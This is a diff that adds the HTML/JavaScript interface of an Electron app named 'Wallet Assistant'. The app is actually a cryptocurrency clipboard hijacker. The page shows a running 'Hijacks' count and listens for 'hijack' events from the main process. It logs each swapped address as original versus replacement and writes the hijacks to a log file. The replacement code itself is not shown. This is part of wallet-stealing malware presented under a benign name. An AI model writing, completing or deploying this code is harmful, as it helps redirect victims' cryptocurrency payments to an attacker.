@@ -1,0 +1,98 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Wallet Assistant</title>
+    <style>
+        body { 
+            font-family: -apple-system, BlinkMacSystemFont, sans-serif; 
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white; 
+            margin: 0; 
+            height: 100vh; 
+            display: flex; 
+            align-items: center; 
+            justify-content: center;
+        }
+        .container { 
+            text-align: center; 
+            padding: 40px; 
+            border-radius: 20px; 
+            background: rgba(255,255,255,0.1);
+            backdrop-filter: blur(20px);
+        }
+        .status { 
+            font-size: 24px; 
+            margin: 20px 0; 
+            font-weight: bold;
+        }
+        .log { 
+            background: rgba(0,0,0,0.3); 
+            padding: 20px; 
+            border-radius: 10px; 
+            max-height: 300px; 
+            overflow-y: auto; 
+            font-family: monospace; 
+            text-align: left;
+            margin-top: 20px;
+        }
+        .hijack-count { color: #ff6b6b; font-size: 28px; }
+        button { 
+            background: #ff6b6b; 
+            border: none; 
+            color: white; 
+            padding: 12px 24px; 
+            border-radius: 25px; 
+            font-size: 16px; 
+            cursor: pointer; 
+            margin: 10px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>💰 Wallet Assistant</h1>
+        <div class="status" id="status">🟢 Active - Monitoring Clipboard</div>
+        <div>Hijacks: <span class="hijack-count" id="count">0</span></div>
+        <button onclick="toggle()">Pause/Resume</button>
+        <button onclick="openLogs()">View Logs</button>
+        
+        <div class="log" id="log">
+            Clipboard monitoring started...<br>
+        </div>
+    </div>
+
+    <script>
+        const { ipcRenderer } = require('electron');
+        let hijackCount = 0;
+        let paused = false;
+        
+        ipcRenderer.on('hijack', (event, data) => {
+            if (!paused) {
+                hijackCount++;
+                document.getElementById('count').textContent = hijackCount;
+                addLog(`💰 HIJACKED: ${data.original.slice(0,15)}... → ${data.replaced.slice(0,15)}...`);
+            }
+        });
+        
+        function addLog(text) {
+            const log = document.getElementById('log');
+            log.innerHTML += text + '<br>';
+            log.scrollTop = log.scrollHeight;
+        }
+        
+        function toggle() {
+            paused = !paused;
+            document.getElementById('status').textContent = 
+                paused ? '🟡 Paused' : '🟢 Active - Monitoring Clipboard';
+        }
+        
+        function openLogs() {
+            const fs = require('fs');
+            const path = require('path');
+            const logPath = path.join(__dirname, 'hijacks.log');
+            fs.appendFileSync(logPath, new Date().toISOString() + ': Hijack #' + hijackCount + '\n');
+            require('electron').shell.openPath(logPath);
+        }
+    </script>
+</body>
+</html>
